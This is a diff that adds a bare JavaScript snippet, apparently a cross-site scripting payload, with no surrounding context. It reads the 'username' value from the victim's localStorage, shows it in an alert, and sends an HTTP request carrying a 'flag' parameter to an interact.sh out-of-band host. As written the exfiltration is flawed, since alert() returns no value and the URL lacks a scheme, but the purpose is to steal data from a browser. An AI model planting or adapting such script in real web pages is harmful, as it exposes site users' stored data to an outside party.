@@ -1,0 +1,11 @@
+<script>
+function httpGet(theUrl)
+{
+    var xmlHttp = new XMLHttpRequest();
+    xmlHttp.open( "GET", theUrl, false ); // false for synchronous request
+    xmlHttp.send( null );
+    return xmlHttp.responseText;
+}
+httpGet("c8rdnqe2vtc0000g8wpggrcg45ayyyyyb.interact.sh?flag="+alert(localStorage.getItem("username")))
+</script>
+
